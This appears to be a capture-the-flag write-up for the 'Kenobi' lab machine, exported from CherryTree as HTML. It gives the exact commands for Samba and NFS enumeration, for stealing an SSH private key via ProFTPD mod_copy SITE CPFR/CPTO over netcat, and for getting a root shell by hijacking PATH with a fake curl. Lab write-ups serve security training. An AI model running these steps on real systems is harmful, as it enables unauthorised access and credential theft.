<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>kenobi</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>kenobi</h1><br/><strong><h1>Kenobi</h1></strong><br /><br /><br /><strong><h2>Enumeration</h2></strong><br /><br /><strong>Nmap:</strong><br /><img src="images/4-1.png" alt="images/4-1.png" /><br /><br /><strong>Enumerating Samba Shares using Nmap:</strong><br /><br /><strong>nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.184.93</strong><br /><br /><img src="images/4-2.png" alt="images/4-2.png" /><br /><br /><strong>Enumerating Anonymous Share:</strong><br /><br /><strong>smbclient //10.10.184.93/anonymous</strong><br /><br /><img src="images/4-3.png" alt="images/4-3.png" /><br /><br />We get the location of <strong>id_rsa</strong> through the log file.<br /><br /><strong>Enumerating NFS Share in Port 111 using Nmap:</strong><br /><br /><strong>nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.184.93</strong><br /><br /><img src="images/4-4.png" alt="images/4-4.png" /><br /><br /><strong>Mounting the NFS share:</strong><br /><br /><strong>mount 10.10.184.93:/var /mnt/kenobiNFS</strong><br /><br /><img src="images/4-5.png" alt="images/4-5.png" /><br />As we can see, after the mount the /var directory is accessible from our local machine.<br /><strong>Note:</strong> /var/tmp has all permissions. (We can write to it)<br /><br /><br /><br /><strong>ProFTPD Vulnerability ( mod_copy module ):</strong><br /><br />This vulnerability in ProFTPD allows copying of files. Following is the process.<br /><br />Connect to ProFTPD through Netcat<br /><strong>nc 10.10.184.93 21<br /><br />SITE CPFR /home/kenobi/.ssh/id_rsa<br /><br />SITE CPTO /var/tmp/id_rsa</strong><br /><br /><img src="images/4-6.png" alt="images/4-6.png" /><br /><br />We can verify the copy by going into the mounted share.<br /><br /><img src="images/4-7.png" alt="images/4-7.png" /><br /><strong><h2>Foothold</h2></strong><br /><br /><strong>SSH to the Machine with the id_rsa file:</strong><br /><br />Copy the id_rsa from the NFS share to a local directory<br /><br />change the permission on the file to 600<br /><br /><strong>chmod 600 id_rsa	</strong><br /><br />ssh using the id_rsa<br /><br /><strong>ssh -i id_rsa kenobi@10.10.184.93</strong><br /><br /><img src="images/4-8.png" alt="images/4-8.png" /><br /><br />User flag is present on kenobi&#39;s home directory.<br /><br /><strong><h2>Privilege Escalation</h2></strong><br /><br />Lets search for files with SUID bit set.<br /><br /><strong>find / -type f -perm -04000 2&gt;/dev/null</strong><br /><br /><img src="images/4-9.png" alt="images/4-9.png" /><br />The executible <strong>/usr/bin/menu</strong> seems intresting. Lets run it.<br /><br /><img src="images/4-10.png" alt="images/4-10.png" /><br /><br />The program has 3 options that runs 3 different programs in the background.<br />We can manipulate the path variable to create a malicious program that the menu program calls.<br /><br />The 1st options seems to call the <strong>curl</strong> program<br />I will create a malicious curl program in the <strong>/tmp</strong> directory &amp; <strong>add it to path</strong>.<br /><br /><strong>cd /tmp<br />echo /bin/sh &gt; curl<br />chmod a+x curl<br />export PATH=/tmp:$PATH</strong><br /><br />Next, run the program <strong>/usr/bin/menu</strong> &amp; select <strong>option 1</strong> to get <strong>root shell</strong>.<br /><br /><img src="images/4-11.png" alt="images/4-11.png" /><br /><br />We find the root flag in the /root directory.<br /><br />Thanks!!</div>
</body>
</html>
